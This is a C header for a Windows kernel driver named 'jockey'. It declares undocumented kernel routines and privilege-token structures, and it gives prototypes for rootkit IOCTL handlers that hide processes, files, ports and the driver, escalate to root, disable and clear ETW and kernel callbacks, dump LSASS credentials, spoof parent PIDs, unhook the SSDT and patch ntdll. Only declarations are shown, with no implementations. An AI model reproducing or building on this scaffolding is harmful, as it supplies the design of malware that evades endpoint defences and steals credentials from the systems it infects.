#pragma once

/* Silence WDK-promoted warnings. The WDK force-includes a header
 * (warning.h) that turns C4028 (formal param mismatch) and friends
 * into hard errors. Disabling here overrides that for this TU. */
#pragma warning(disable: 4028)   /* formal parameter N different from declaration */
#pragma warning(disable: 4022)   /* pointer mismatch for actual parameter */
#pragma warning(disable: 4133)   /* incompatible pointer types */
#pragma warning(disable: 4312)   /* type cast from ULONG to pointer of greater size */
#pragma warning(disable: 4100)   /* unreferenced formal parameter */


#ifndef NTDDI_VERSION
#define NTDDI_VERSION NTDDI_WIN10_RS5
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00
#endif
#ifndef WINVER
#define WINVER 0x0A00
#endif
#ifndef JOCKEY_TAG
#define JOCKEY_TAG 'yeko'
#endif

/*
 * Use ntddk.h ONLY. It pulls in wdm.h with the correct guards.
 * Do NOT include ntifs.h - it causes KeQueryPerformanceCounter
 * redefinition errors when the WDK is 10.0.28000.0 or newer.
 * Anything ntifs.h would have declared is declared manually below.
 */
#include <ntddk.h>
#include <ntstrsafe.h>

/* ---- fixed-width integer types ---- */
typedef UINT8  uint8_t;
typedef UINT16 uint16_t;
typedef UINT32 uint32_t;
typedef UINT64 uint64_t;
typedef INT8   int8_t;
typedef INT16  int16_t;
typedef INT32  int32_t;
typedef INT64  int64_t;

/* ---- LDR loader flags ---- */
#ifndef LDRP_LOAD_IN_PROGRESS
#define LDRP_LOAD_IN_PROGRESS       0x0001
#endif
#ifndef LDRP_ENTRY_PROCESSED
#define LDRP_ENTRY_PROCESSED        0x0004
#endif
#ifndef LDRP_PROCESS_ATTACH_CALLED
#define LDRP_PROCESS_ATTACH_CALLED  0x0008
#endif

/* ---- private LDR entry ---- */
typedef struct _JOCKEY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG          Flags;
    USHORT         LoadCount;
    USHORT         TlsIndex;
    LIST_ENTRY     HashLinks;
    ULONG          TimeDateStamp;
} JOCKEY_LDR_DATA_TABLE_ENTRY, *PJOCKEY_LDR_DATA_TABLE_ENTRY;

/* ---- token / privilege constants ---- */
#ifndef TOKEN_QUERY
#define TOKEN_QUERY              0x0008
#endif
#ifndef TOKEN_ADJUST_PRIVILEGES
#define TOKEN_ADJUST_PRIVILEGES  0x0020
#endif
#ifndef TOKEN_DUPLICATE
#define TOKEN_DUPLICATE          0x0002
#endif
#ifndef PROCESS_QUERY_INFORMATION
#define PROCESS_QUERY_INFORMATION 0x0400
#endif

#ifndef SE_DEBUG_NAME
#define SE_DEBUG_NAME           L"SeDebugPrivilege"
#endif
#ifndef SE_TCB_NAME
#define SE_TCB_NAME             L"SeTcbPrivilege"
#endif
#ifndef SE_IMPERSONATE_NAME
#define SE_IMPERSONATE_NAME     L"SeImpersonatePrivilege"
#endif
#ifndef SE_LOAD_DRIVER_NAME
#define SE_LOAD_DRIVER_NAME     L"SeLoadDriverPrivilege"
#endif
#ifndef SE_BACKUP_NAME
#define SE_BACKUP_NAME          L"SeBackupPrivilege"
#endif
#ifndef SE_RESTORE_NAME
#define SE_RESTORE_NAME         L"SeRestorePrivilege"
#endif
#ifndef SE_TAKE_OWNERSHIP_NAME
#define SE_TAKE_OWNERSHIP_NAME  L"SeTakeOwnershipPrivilege"
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

/* ---- private handle table types ---- */
typedef struct _JOCKEY_HANDLE_TABLE {
    ULONG      TableCode;
    PEPROCESS  QuotaProcess;
    PVOID      UniqueProcessId;
    LIST_ENTRY HandleTableList;
    ULONG      Flags;
    PVOID      NextHandleNeedingPool;
    LONG       ExtraInfoPages;
    ULONG      NextHandleFree;
} JOCKEY_HANDLE_TABLE, *PJOCKEY_HANDLE_TABLE;

typedef struct _JOCKEY_HANDLE_TABLE_ENTRY {
    PVOID Object;
    ULONG GrantedAccess;
    ULONG CreatorBackTraceIndex;
    ULONG ObAttributes;
    ULONG Value;
} JOCKEY_HANDLE_TABLE_ENTRY, *PJOCKEY_HANDLE_TABLE_ENTRY;

#define PHANDLE_TABLE       PJOCKEY_HANDLE_TABLE
#define PHANDLE_TABLE_ENTRY PJOCKEY_HANDLE_TABLE_ENTRY


/* ============================================================
 * Manually defined privilege/token structures + Ps prototypes
 * (ntddk.h alone doesn't provide these)
 * ============================================================ */
#ifndef _JOCKEY_LUID_AND_ATTRIBUTES_
#define _JOCKEY_LUID_AND_ATTRIBUTES_
typedef struct _JOCKEY_LUID_AND_ATTRIBUTES {
    LUID  Luid;
    ULONG Attributes;
} JOCKEY_LUID_AND_ATTRIBUTES, *PJOCKEY_LUID_AND_ATTRIBUTES;

typedef struct _JOCKEY_TOKEN_PRIVILEGES {
    ULONG PrivilegeCount;
    JOCKEY_LUID_AND_ATTRIBUTES Privileges[1];
} JOCKEY_TOKEN_PRIVILEGES, *PJOCKEY_TOKEN_PRIVILEGES;

#define LUID_AND_ATTRIBUTES   JOCKEY_LUID_AND_ATTRIBUTES
#define TOKEN_PRIVILEGES      JOCKEY_TOKEN_PRIVILEGES
#define PTOKEN_PRIVILEGES     PJOCKEY_TOKEN_PRIVILEGES
#endif

#ifdef __cplusplus
extern "C" {
#endif

NTSTATUS NTAPI PsLookupProcessByProcessId(
    _In_  HANDLE    ProcessId,
    _Out_ PEPROCESS *Process);

NTSTATUS NTAPI PsLookupThreadByThreadId(
    _In_  HANDLE   ThreadId,
    _Out_ PETHREAD *Thread);



#ifdef __cplusplus
}
#endif

/* ================================================================
 * Manual declarations for routines normally in ntifs.h
 * ================================================================ */
#ifdef __cplusplus
extern "C" {
#endif

NTSTATUS NTAPI ZwProtectVirtualMemory(
    _In_    HANDLE  ProcessHandle,
    _Inout_ PVOID  *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_    ULONG   NewProtect,
    _Out_   PULONG  OldProtect);

NTSTATUS NTAPI MmCopyVirtualMemory(
    _In_  PEPROCESS        SourceProcess,
    _In_  PVOID            SourceAddress,
    _In_  PEPROCESS        TargetProcess,
    _In_  PVOID            TargetAddress,
    _In_  SIZE_T           BufferSize,
    _In_  KPROCESSOR_MODE  PreviousMode,
    _Out_ PSIZE_T          ReturnSize);

NTSTATUS NTAPI ZwOpenProcessToken(
    _In_  HANDLE      ProcessHandle,
    _In_  ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE     TokenHandle);

NTSTATUS NTAPI ZwAdjustPrivilegesToken(
    _In_      HANDLE            TokenHandle,
    _In_      BOOLEAN           DisableAllPrivileges,
    _In_opt_  PTOKEN_PRIVILEGES NewState,
    _In_      ULONG             BufferLength,
    _Out_opt_ PTOKEN_PRIVILEGES PreviousState,
    _Out_opt_ PULONG            ReturnLength);

/* 2-arg wrapper matching the call site in jockey_cred.c */


#ifdef __cplusplus
}
#endif


/* ---- defined in jockey_resolve.c ---- */
NTSTATUS NTAPI SeLookupPrivilegeValue(
    _In_  PCWSTR Name,
    _Out_ PLUID  Luid);

NTSTATUS NTAPI PsTerminateProcess(
    _In_ PEPROCESS Process,
    _In_ NTSTATUS  ExitStatus);

/* ================================================================
 * ioctl prototypes - 3 args to match call sites in jockey_km.c
 * ================================================================ */
NTSTATUS jockey_ioctl_hide_pid(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_unhide_pid(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_hide_file(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_unhide_file(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_get_root(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_kill_pid(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_disable_etw(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_disable_ob_callbacks(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_hide_driver(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_protect_mem(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_disable_callbacks(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_hide_thread(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_spoof_ppid(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_clear_etw(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_dump_lsass(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_hide_port(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_process_shield(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_unhook_ssdt(PVOID, ULONG, PVOID *);
NTSTATUS jockey_ioctl_patch_ntdll(PVOID, ULONG, PVOID *);

NTSTATUS jockey_patch_memory(PVOID, PVOID, SIZE_T);

#pragma warning(disable: 4996)
#pragma warning(disable: 4101)
